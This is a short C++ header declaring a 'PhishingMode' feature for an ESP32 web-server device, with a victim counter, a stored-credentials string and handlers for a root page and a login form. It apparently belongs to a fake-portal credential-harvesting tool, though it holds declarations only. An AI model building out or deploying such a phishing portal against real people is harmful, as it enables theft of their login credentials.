#ifndef PHISHING_MODE_H
#define PHISHING_MODE_H

// Include the WebServer library to define AsyncWebServerRequest
#include <ESPAsyncWebServer.h>
#include "Feature.h"
#include "../modules/WiFiManager.h"

class PhishingMode : public Feature {
public:
    void begin() override;
    void update() override;
    void draw() override;
    void stop() override;

private:
    int victimCount = 0;
    String lastCreds = "";
    
    // Web Server handlers (Static to be used in callback)
    static void handleRoot(AsyncWebServerRequest *request);
    static void handleLogin(AsyncWebServerRequest *request);
};

#endif
